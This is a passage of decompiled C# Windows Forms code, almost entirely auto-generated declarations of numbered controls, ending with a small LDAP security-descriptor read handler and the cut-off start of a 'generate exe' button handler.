		internal virtual TreeView TreeView16 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000411 RID: 1041
		// (get) Token: 0x0600083D RID: 2109 RVA: 0x0002897C File Offset: 0x00026B7C
		// (set) Token: 0x0600083E RID: 2110 RVA: 0x00028984 File Offset: 0x00026B84
		internal virtual PictureBox PictureBox32 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000412 RID: 1042
		// (get) Token: 0x0600083F RID: 2111 RVA: 0x0002898D File Offset: 0x00026B8D
		// (set) Token: 0x06000840 RID: 2112 RVA: 0x00028995 File Offset: 0x00026B95
		internal virtual NumericUpDown NumericUpDown16 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000413 RID: 1043
		// (get) Token: 0x06000841 RID: 2113 RVA: 0x0002899E File Offset: 0x00026B9E
		// (set) Token: 0x06000842 RID: 2114 RVA: 0x000289A6 File Offset: 0x00026BA6
		internal virtual ProgressBar ProgressBar63 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000414 RID: 1044
		// (get) Token: 0x06000843 RID: 2115 RVA: 0x000289AF File Offset: 0x00026BAF
		// (set) Token: 0x06000844 RID: 2116 RVA: 0x000289B7 File Offset: 0x00026BB7
		internal virtual RadioButton RadioButton32 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000415 RID: 1045
		// (get) Token: 0x06000845 RID: 2117 RVA: 0x000289C0 File Offset: 0x00026BC0
		// (set) Token: 0x06000846 RID: 2118 RVA: 0x000289C8 File Offset: 0x00026BC8
		internal virtual LinkLabel LinkLabel46 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000416 RID: 1046
		// (get) Token: 0x06000847 RID: 2119 RVA: 0x000289D1 File Offset: 0x00026BD1
		// (set) Token: 0x06000848 RID: 2120 RVA: 0x000289D9 File Offset: 0x00026BD9
		internal virtual CheckBox CheckBox31 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000417 RID: 1047
		// (get) Token: 0x06000849 RID: 2121 RVA: 0x000289E2 File Offset: 0x00026BE2
		// (set) Token: 0x0600084A RID: 2122 RVA: 0x000289EA File Offset: 0x00026BEA
		internal virtual ComboBox ComboBox31 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000418 RID: 1048
		// (get) Token: 0x0600084B RID: 2123 RVA: 0x000289F3 File Offset: 0x00026BF3
		// (set) Token: 0x0600084C RID: 2124 RVA: 0x000289FB File Offset: 0x00026BFB
		internal virtual Button Button31 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000419 RID: 1049
		// (get) Token: 0x0600084D RID: 2125 RVA: 0x00028A04 File Offset: 0x00026C04
		// (set) Token: 0x0600084E RID: 2126 RVA: 0x00028A0C File Offset: 0x00026C0C
		internal virtual CheckedListBox CheckedListBox47 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700041A RID: 1050
		// (get) Token: 0x0600084F RID: 2127 RVA: 0x00028A15 File Offset: 0x00026C15
		// (set) Token: 0x06000850 RID: 2128 RVA: 0x00028A1D File Offset: 0x00026C1D
		internal virtual ComboBox ComboBox32 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700041B RID: 1051
		// (get) Token: 0x06000851 RID: 2129 RVA: 0x00028A26 File Offset: 0x00026C26
		// (set) Token: 0x06000852 RID: 2130 RVA: 0x00028A2E File Offset: 0x00026C2E
		internal virtual MonthCalendar MonthCalendar33 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700041C RID: 1052
		// (get) Token: 0x06000853 RID: 2131 RVA: 0x00028A37 File Offset: 0x00026C37
		// (set) Token: 0x06000854 RID: 2132 RVA: 0x00028A3F File Offset: 0x00026C3F
		internal virtual MonthCalendar MonthCalendar34 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700041D RID: 1053
		// (get) Token: 0x06000855 RID: 2133 RVA: 0x00028A48 File Offset: 0x00026C48
		// (set) Token: 0x06000856 RID: 2134 RVA: 0x00028A50 File Offset: 0x00026C50
		internal virtual LinkLabel LinkLabel47 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700041E RID: 1054
		// (get) Token: 0x06000857 RID: 2135 RVA: 0x00028A59 File Offset: 0x00026C59
		// (set) Token: 0x06000858 RID: 2136 RVA: 0x00028A61 File Offset: 0x00026C61
		internal virtual ProgressBar ProgressBar64 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700041F RID: 1055
		// (get) Token: 0x06000859 RID: 2137 RVA: 0x00028A6A File Offset: 0x00026C6A
		// (set) Token: 0x0600085A RID: 2138 RVA: 0x00028A72 File Offset: 0x00026C72
		internal virtual LinkLabel LinkLabel48 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000420 RID: 1056
		// (get) Token: 0x0600085B RID: 2139 RVA: 0x00028A7B File Offset: 0x00026C7B
		// (set) Token: 0x0600085C RID: 2140 RVA: 0x00028A83 File Offset: 0x00026C83
		internal virtual ListBox ListBox48 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000421 RID: 1057
		// (get) Token: 0x0600085D RID: 2141 RVA: 0x00028A8C File Offset: 0x00026C8C
		// (set) Token: 0x0600085E RID: 2142 RVA: 0x00028A94 File Offset: 0x00026C94
		internal virtual CheckBox CheckBox32 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000422 RID: 1058
		// (get) Token: 0x0600085F RID: 2143 RVA: 0x00028A9D File Offset: 0x00026C9D
		// (set) Token: 0x06000860 RID: 2144 RVA: 0x00028AA5 File Offset: 0x00026CA5
		internal virtual CheckedListBox CheckedListBox48 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000423 RID: 1059
		// (get) Token: 0x06000861 RID: 2145 RVA: 0x00028AAE File Offset: 0x00026CAE
		// (set) Token: 0x06000862 RID: 2146 RVA: 0x00028AB6 File Offset: 0x00026CB6
		internal virtual Button Button32 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000424 RID: 1060
		// (get) Token: 0x06000863 RID: 2147 RVA: 0x00028ABF File Offset: 0x00026CBF
		// (set) Token: 0x06000864 RID: 2148 RVA: 0x00028AC7 File Offset: 0x00026CC7
		internal virtual ProgressBar ProgressBar65 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000425 RID: 1061
		// (get) Token: 0x06000865 RID: 2149 RVA: 0x00028AD0 File Offset: 0x00026CD0
		// (set) Token: 0x06000866 RID: 2150 RVA: 0x00028AD8 File Offset: 0x00026CD8
		internal virtual ProgressBar ProgressBar66 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000426 RID: 1062
		// (get) Token: 0x06000867 RID: 2151 RVA: 0x00028AE1 File Offset: 0x00026CE1
		// (set) Token: 0x06000868 RID: 2152 RVA: 0x00028AE9 File Offset: 0x00026CE9
		internal virtual DateTimePicker DateTimePicker33 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000427 RID: 1063
		// (get) Token: 0x06000869 RID: 2153 RVA: 0x00028AF2 File Offset: 0x00026CF2
		// (set) Token: 0x0600086A RID: 2154 RVA: 0x00028AFA File Offset: 0x00026CFA
		internal virtual CheckedListBox CheckedListBox49 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000428 RID: 1064
		// (get) Token: 0x0600086B RID: 2155 RVA: 0x00028B03 File Offset: 0x00026D03
		// (set) Token: 0x0600086C RID: 2156 RVA: 0x00028B0B File Offset: 0x00026D0B
		internal virtual ListBox ListBox49 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000429 RID: 1065
		// (get) Token: 0x0600086D RID: 2157 RVA: 0x00028B14 File Offset: 0x00026D14
		// (set) Token: 0x0600086E RID: 2158 RVA: 0x00028B1C File Offset: 0x00026D1C
		internal virtual DateTimePicker DateTimePicker34 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700042A RID: 1066
		// (get) Token: 0x0600086F RID: 2159 RVA: 0x00028B25 File Offset: 0x00026D25
		// (set) Token: 0x06000870 RID: 2160 RVA: 0x00028B2D File Offset: 0x00026D2D
		internal virtual ListBox ListBox50 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700042B RID: 1067
		// (get) Token: 0x06000871 RID: 2161 RVA: 0x00028B36 File Offset: 0x00026D36
		// (set) Token: 0x06000872 RID: 2162 RVA: 0x00028B3E File Offset: 0x00026D3E
		internal virtual Label Label17 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700042C RID: 1068
		// (get) Token: 0x06000873 RID: 2163 RVA: 0x00028B47 File Offset: 0x00026D47
		// (set) Token: 0x06000874 RID: 2164 RVA: 0x00028B4F File Offset: 0x00026D4F
		internal virtual MaskedTextBox MaskedTextBox33 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700042D RID: 1069
		// (get) Token: 0x06000875 RID: 2165 RVA: 0x00028B58 File Offset: 0x00026D58
		// (set) Token: 0x06000876 RID: 2166 RVA: 0x00028B60 File Offset: 0x00026D60
		internal virtual RadioButton RadioButton33 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700042E RID: 1070
		// (get) Token: 0x06000877 RID: 2167 RVA: 0x00028B69 File Offset: 0x00026D69
		// (set) Token: 0x06000878 RID: 2168 RVA: 0x00028B71 File Offset: 0x00026D71
		internal virtual PictureBox PictureBox33 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700042F RID: 1071
		// (get) Token: 0x06000879 RID: 2169 RVA: 0x00028B7A File Offset: 0x00026D7A
		// (set) Token: 0x0600087A RID: 2170 RVA: 0x00028B82 File Offset: 0x00026D82
		internal virtual MaskedTextBox MaskedTextBox34 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000430 RID: 1072
		// (get) Token: 0x0600087B RID: 2171 RVA: 0x00028B8B File Offset: 0x00026D8B
		// (set) Token: 0x0600087C RID: 2172 RVA: 0x00028B93 File Offset: 0x00026D93
		internal virtual WebBrowser WebBrowser17 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000431 RID: 1073
		// (get) Token: 0x0600087D RID: 2173 RVA: 0x00028B9C File Offset: 0x00026D9C
		// (set) Token: 0x0600087E RID: 2174 RVA: 0x00028BA4 File Offset: 0x00026DA4
		internal virtual TreeView TreeView17 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000432 RID: 1074
		// (get) Token: 0x0600087F RID: 2175 RVA: 0x00028BAD File Offset: 0x00026DAD
		// (set) Token: 0x06000880 RID: 2176 RVA: 0x00028BB5 File Offset: 0x00026DB5
		internal virtual PictureBox PictureBox34 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000433 RID: 1075
		// (get) Token: 0x06000881 RID: 2177 RVA: 0x00028BBE File Offset: 0x00026DBE
		// (set) Token: 0x06000882 RID: 2178 RVA: 0x00028BC6 File Offset: 0x00026DC6
		internal virtual NumericUpDown NumericUpDown17 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000434 RID: 1076
		// (get) Token: 0x06000883 RID: 2179 RVA: 0x00028BCF File Offset: 0x00026DCF
		// (set) Token: 0x06000884 RID: 2180 RVA: 0x00028BD7 File Offset: 0x00026DD7
		internal virtual ProgressBar ProgressBar67 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000435 RID: 1077
		// (get) Token: 0x06000885 RID: 2181 RVA: 0x00028BE0 File Offset: 0x00026DE0
		// (set) Token: 0x06000886 RID: 2182 RVA: 0x00028BE8 File Offset: 0x00026DE8
		internal virtual RadioButton RadioButton34 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000436 RID: 1078
		// (get) Token: 0x06000887 RID: 2183 RVA: 0x00028BF1 File Offset: 0x00026DF1
		// (set) Token: 0x06000888 RID: 2184 RVA: 0x00028BF9 File Offset: 0x00026DF9
		internal virtual LinkLabel LinkLabel49 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000437 RID: 1079
		// (get) Token: 0x06000889 RID: 2185 RVA: 0x00028C02 File Offset: 0x00026E02
		// (set) Token: 0x0600088A RID: 2186 RVA: 0x00028C0A File Offset: 0x00026E0A
		internal virtual CheckBox CheckBox33 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000438 RID: 1080
		// (get) Token: 0x0600088B RID: 2187 RVA: 0x00028C13 File Offset: 0x00026E13
		// (set) Token: 0x0600088C RID: 2188 RVA: 0x00028C1B File Offset: 0x00026E1B
		internal virtual ComboBox ComboBox33 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000439 RID: 1081
		// (get) Token: 0x0600088D RID: 2189 RVA: 0x00028C24 File Offset: 0x00026E24
		// (set) Token: 0x0600088E RID: 2190 RVA: 0x00028C2C File Offset: 0x00026E2C
		internal virtual Button Button33 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700043A RID: 1082
		// (get) Token: 0x0600088F RID: 2191 RVA: 0x00028C35 File Offset: 0x00026E35
		// (set) Token: 0x06000890 RID: 2192 RVA: 0x00028C3D File Offset: 0x00026E3D
		internal virtual ToolTip ToolTip3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700043B RID: 1083
		// (get) Token: 0x06000891 RID: 2193 RVA: 0x00028C46 File Offset: 0x00026E46
		// (set) Token: 0x06000892 RID: 2194 RVA: 0x00028C4E File Offset: 0x00026E4E
		internal virtual NotifyIcon NotifyIcon3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700043C RID: 1084
		// (get) Token: 0x06000893 RID: 2195 RVA: 0x00028C57 File Offset: 0x00026E57
		// (set) Token: 0x06000894 RID: 2196 RVA: 0x00028C5F File Offset: 0x00026E5F
		internal virtual CheckedListBox CheckedListBox50 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700043D RID: 1085
		// (get) Token: 0x06000895 RID: 2197 RVA: 0x00028C68 File Offset: 0x00026E68
		// (set) Token: 0x06000896 RID: 2198 RVA: 0x00028C70 File Offset: 0x00026E70
		internal virtual ComboBox ComboBox34 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700043E RID: 1086
		// (get) Token: 0x06000897 RID: 2199 RVA: 0x00028C79 File Offset: 0x00026E79
		// (set) Token: 0x06000898 RID: 2200 RVA: 0x00028C81 File Offset: 0x00026E81
		internal virtual MonthCalendar MonthCalendar35 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700043F RID: 1087
		// (get) Token: 0x06000899 RID: 2201 RVA: 0x00028C8A File Offset: 0x00026E8A
		// (set) Token: 0x0600089A RID: 2202 RVA: 0x00028C92 File Offset: 0x00026E92
		internal virtual MonthCalendar MonthCalendar36 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000440 RID: 1088
		// (get) Token: 0x0600089B RID: 2203 RVA: 0x00028C9B File Offset: 0x00026E9B
		// (set) Token: 0x0600089C RID: 2204 RVA: 0x00028CA3 File Offset: 0x00026EA3
		internal virtual LinkLabel LinkLabel50 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000441 RID: 1089
		// (get) Token: 0x0600089D RID: 2205 RVA: 0x00028CAC File Offset: 0x00026EAC
		// (set) Token: 0x0600089E RID: 2206 RVA: 0x00028CB4 File Offset: 0x00026EB4
		internal virtual ProgressBar ProgressBar68 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000442 RID: 1090
		// (get) Token: 0x0600089F RID: 2207 RVA: 0x00028CBD File Offset: 0x00026EBD
		// (set) Token: 0x060008A0 RID: 2208 RVA: 0x00028CC5 File Offset: 0x00026EC5
		internal virtual LinkLabel LinkLabel51 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000443 RID: 1091
		// (get) Token: 0x060008A1 RID: 2209 RVA: 0x00028CCE File Offset: 0x00026ECE
		// (set) Token: 0x060008A2 RID: 2210 RVA: 0x00028CD6 File Offset: 0x00026ED6
		internal virtual ListBox ListBox51 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000444 RID: 1092
		// (get) Token: 0x060008A3 RID: 2211 RVA: 0x00028CDF File Offset: 0x00026EDF
		// (set) Token: 0x060008A4 RID: 2212 RVA: 0x00028CE7 File Offset: 0x00026EE7
		internal virtual CheckBox CheckBox34 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000445 RID: 1093
		// (get) Token: 0x060008A5 RID: 2213 RVA: 0x00028CF0 File Offset: 0x00026EF0
		// (set) Token: 0x060008A6 RID: 2214 RVA: 0x00028CF8 File Offset: 0x00026EF8
		internal virtual CheckedListBox CheckedListBox51 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000446 RID: 1094
		// (get) Token: 0x060008A7 RID: 2215 RVA: 0x00028D01 File Offset: 0x00026F01
		// (set) Token: 0x060008A8 RID: 2216 RVA: 0x00028D09 File Offset: 0x00026F09
		internal virtual Button Button34 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000447 RID: 1095
		// (get) Token: 0x060008A9 RID: 2217 RVA: 0x00028D12 File Offset: 0x00026F12
		// (set) Token: 0x060008AA RID: 2218 RVA: 0x00028D1A File Offset: 0x00026F1A
		internal virtual ProgressBar ProgressBar69 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000448 RID: 1096
		// (get) Token: 0x060008AB RID: 2219 RVA: 0x00028D23 File Offset: 0x00026F23
		// (set) Token: 0x060008AC RID: 2220 RVA: 0x00028D2B File Offset: 0x00026F2B
		internal virtual ProgressBar ProgressBar70 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000449 RID: 1097
		// (get) Token: 0x060008AD RID: 2221 RVA: 0x00028D34 File Offset: 0x00026F34
		// (set) Token: 0x060008AE RID: 2222 RVA: 0x00028D3C File Offset: 0x00026F3C
		internal virtual DateTimePicker DateTimePicker35 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700044A RID: 1098
		// (get) Token: 0x060008AF RID: 2223 RVA: 0x00028D45 File Offset: 0x00026F45
		// (set) Token: 0x060008B0 RID: 2224 RVA: 0x00028D4D File Offset: 0x00026F4D
		internal virtual CheckedListBox CheckedListBox52 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700044B RID: 1099
		// (get) Token: 0x060008B1 RID: 2225 RVA: 0x00028D56 File Offset: 0x00026F56
		// (set) Token: 0x060008B2 RID: 2226 RVA: 0x00028D5E File Offset: 0x00026F5E
		internal virtual ListBox ListBox52 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700044C RID: 1100
		// (get) Token: 0x060008B3 RID: 2227 RVA: 0x00028D67 File Offset: 0x00026F67
		// (set) Token: 0x060008B4 RID: 2228 RVA: 0x00028D6F File Offset: 0x00026F6F
		internal virtual DateTimePicker DateTimePicker36 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700044D RID: 1101
		// (get) Token: 0x060008B5 RID: 2229 RVA: 0x00028D78 File Offset: 0x00026F78
		// (set) Token: 0x060008B6 RID: 2230 RVA: 0x00028D80 File Offset: 0x00026F80
		internal virtual ListBox ListBox53 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700044E RID: 1102
		// (get) Token: 0x060008B7 RID: 2231 RVA: 0x00028D89 File Offset: 0x00026F89
		// (set) Token: 0x060008B8 RID: 2232 RVA: 0x00028D91 File Offset: 0x00026F91
		internal virtual Label Label18 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700044F RID: 1103
		// (get) Token: 0x060008B9 RID: 2233 RVA: 0x00028D9A File Offset: 0x00026F9A
		// (set) Token: 0x060008BA RID: 2234 RVA: 0x00028DA2 File Offset: 0x00026FA2
		internal virtual MaskedTextBox MaskedTextBox35 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000450 RID: 1104
		// (get) Token: 0x060008BB RID: 2235 RVA: 0x00028DAB File Offset: 0x00026FAB
		// (set) Token: 0x060008BC RID: 2236 RVA: 0x00028DB3 File Offset: 0x00026FB3
		internal virtual RadioButton RadioButton35 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000451 RID: 1105
		// (get) Token: 0x060008BD RID: 2237 RVA: 0x00028DBC File Offset: 0x00026FBC
		// (set) Token: 0x060008BE RID: 2238 RVA: 0x00028DC4 File Offset: 0x00026FC4
		internal virtual PictureBox PictureBox35 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000452 RID: 1106
		// (get) Token: 0x060008BF RID: 2239 RVA: 0x00028DCD File Offset: 0x00026FCD
		// (set) Token: 0x060008C0 RID: 2240 RVA: 0x00028DD5 File Offset: 0x00026FD5
		internal virtual MaskedTextBox MaskedTextBox36 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000453 RID: 1107
		// (get) Token: 0x060008C1 RID: 2241 RVA: 0x00028DDE File Offset: 0x00026FDE
		// (set) Token: 0x060008C2 RID: 2242 RVA: 0x00028DE6 File Offset: 0x00026FE6
		internal virtual WebBrowser WebBrowser18 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000454 RID: 1108
		// (get) Token: 0x060008C3 RID: 2243 RVA: 0x00028DEF File Offset: 0x00026FEF
		// (set) Token: 0x060008C4 RID: 2244 RVA: 0x00028DF7 File Offset: 0x00026FF7
		internal virtual TreeView TreeView18 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000455 RID: 1109
		// (get) Token: 0x060008C5 RID: 2245 RVA: 0x00028E00 File Offset: 0x00027000
		// (set) Token: 0x060008C6 RID: 2246 RVA: 0x00028E08 File Offset: 0x00027008
		internal virtual PictureBox PictureBox36 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000456 RID: 1110
		// (get) Token: 0x060008C7 RID: 2247 RVA: 0x00028E11 File Offset: 0x00027011
		// (set) Token: 0x060008C8 RID: 2248 RVA: 0x00028E19 File Offset: 0x00027019
		internal virtual NumericUpDown NumericUpDown18 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000457 RID: 1111
		// (get) Token: 0x060008C9 RID: 2249 RVA: 0x00028E22 File Offset: 0x00027022
		// (set) Token: 0x060008CA RID: 2250 RVA: 0x00028E2A File Offset: 0x0002702A
		internal virtual ProgressBar ProgressBar71 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000458 RID: 1112
		// (get) Token: 0x060008CB RID: 2251 RVA: 0x00028E33 File Offset: 0x00027033
		// (set) Token: 0x060008CC RID: 2252 RVA: 0x00028E3B File Offset: 0x0002703B
		internal virtual RadioButton RadioButton36 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000459 RID: 1113
		// (get) Token: 0x060008CD RID: 2253 RVA: 0x00028E44 File Offset: 0x00027044
		// (set) Token: 0x060008CE RID: 2254 RVA: 0x00028E4C File Offset: 0x0002704C
		internal virtual LinkLabel LinkLabel52 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700045A RID: 1114
		// (get) Token: 0x060008CF RID: 2255 RVA: 0x00028E55 File Offset: 0x00027055
		// (set) Token: 0x060008D0 RID: 2256 RVA: 0x00028E5D File Offset: 0x0002705D
		internal virtual CheckBox CheckBox35 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700045B RID: 1115
		// (get) Token: 0x060008D1 RID: 2257 RVA: 0x00028E66 File Offset: 0x00027066
		// (set) Token: 0x060008D2 RID: 2258 RVA: 0x00028E6E File Offset: 0x0002706E
		internal virtual ComboBox ComboBox35 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700045C RID: 1116
		// (get) Token: 0x060008D3 RID: 2259 RVA: 0x00028E77 File Offset: 0x00027077
		// (set) Token: 0x060008D4 RID: 2260 RVA: 0x00028E7F File Offset: 0x0002707F
		internal virtual Button Button35 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700045D RID: 1117
		// (get) Token: 0x060008D5 RID: 2261 RVA: 0x00028E88 File Offset: 0x00027088
		// (set) Token: 0x060008D6 RID: 2262 RVA: 0x00028E90 File Offset: 0x00027090
		internal virtual CheckedListBox CheckedListBox53 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700045E RID: 1118
		// (get) Token: 0x060008D7 RID: 2263 RVA: 0x00028E99 File Offset: 0x00027099
		// (set) Token: 0x060008D8 RID: 2264 RVA: 0x00028EA1 File Offset: 0x000270A1
		internal virtual ComboBox ComboBox36 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700045F RID: 1119
		// (get) Token: 0x060008D9 RID: 2265 RVA: 0x00028EAA File Offset: 0x000270AA
		// (set) Token: 0x060008DA RID: 2266 RVA: 0x00028EB2 File Offset: 0x000270B2
		internal virtual MonthCalendar MonthCalendar37 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000460 RID: 1120
		// (get) Token: 0x060008DB RID: 2267 RVA: 0x00028EBB File Offset: 0x000270BB
		// (set) Token: 0x060008DC RID: 2268 RVA: 0x00028EC3 File Offset: 0x000270C3
		internal virtual MonthCalendar MonthCalendar38 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000461 RID: 1121
		// (get) Token: 0x060008DD RID: 2269 RVA: 0x00028ECC File Offset: 0x000270CC
		// (set) Token: 0x060008DE RID: 2270 RVA: 0x00028ED4 File Offset: 0x000270D4
		internal virtual LinkLabel LinkLabel53 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000462 RID: 1122
		// (get) Token: 0x060008DF RID: 2271 RVA: 0x00028EDD File Offset: 0x000270DD
		// (set) Token: 0x060008E0 RID: 2272 RVA: 0x00028EE5 File Offset: 0x000270E5
		internal virtual ProgressBar ProgressBar72 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000463 RID: 1123
		// (get) Token: 0x060008E1 RID: 2273 RVA: 0x00028EEE File Offset: 0x000270EE
		// (set) Token: 0x060008E2 RID: 2274 RVA: 0x00028EF6 File Offset: 0x000270F6
		internal virtual MonthCalendar MonthCalendar39 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000464 RID: 1124
		// (get) Token: 0x060008E3 RID: 2275 RVA: 0x00028EFF File Offset: 0x000270FF
		// (set) Token: 0x060008E4 RID: 2276 RVA: 0x00028F07 File Offset: 0x00027107
		internal virtual LinkLabel LinkLabel54 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000465 RID: 1125
		// (get) Token: 0x060008E5 RID: 2277 RVA: 0x00028F10 File Offset: 0x00027110
		// (set) Token: 0x060008E6 RID: 2278 RVA: 0x00028F18 File Offset: 0x00027118
		internal virtual ListBox ListBox54 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000466 RID: 1126
		// (get) Token: 0x060008E7 RID: 2279 RVA: 0x00028F21 File Offset: 0x00027121
		// (set) Token: 0x060008E8 RID: 2280 RVA: 0x00028F29 File Offset: 0x00027129
		internal virtual CheckBox CheckBox36 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000467 RID: 1127
		// (get) Token: 0x060008E9 RID: 2281 RVA: 0x00028F32 File Offset: 0x00027132
		// (set) Token: 0x060008EA RID: 2282 RVA: 0x00028F3A File Offset: 0x0002713A
		internal virtual CheckedListBox CheckedListBox54 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000468 RID: 1128
		// (get) Token: 0x060008EB RID: 2283 RVA: 0x00028F43 File Offset: 0x00027143
		// (set) Token: 0x060008EC RID: 2284 RVA: 0x00028F4B File Offset: 0x0002714B
		internal virtual Button Button36 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x060008ED RID: 2285 RVA: 0x00028F54 File Offset: 0x00027154
		private void btnLerExecutar_Click(object sender, EventArgs e)
		{
			object objectValue = RuntimeHelpers.GetObjectValue(Interaction.GetObject("LDAP://CN=Rob Young, OU=Finance, DC=fabrikam,DC=Com", null));
			RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, null, "Get", new object[]
			{
				"ntSecurityDescriptor"
			}, null, null, null)), null, "DiscretionaryACL", new object[0], null, null, null));
			RuntimeHelpers.GetObjectValue(Interaction.CreateObject("AccessControlEntry", ""));
			NewLateBinding.LateCall(objectValue, null, "SetInfo", new object[0], null, null, null, true);
		}

		// Token: 0x060008EE RID: 2286 RVA: 0x00028FDA File Offset: 0x000271DA
		private void btnGerarExe_Click(object sender, EventArgs e)
		{
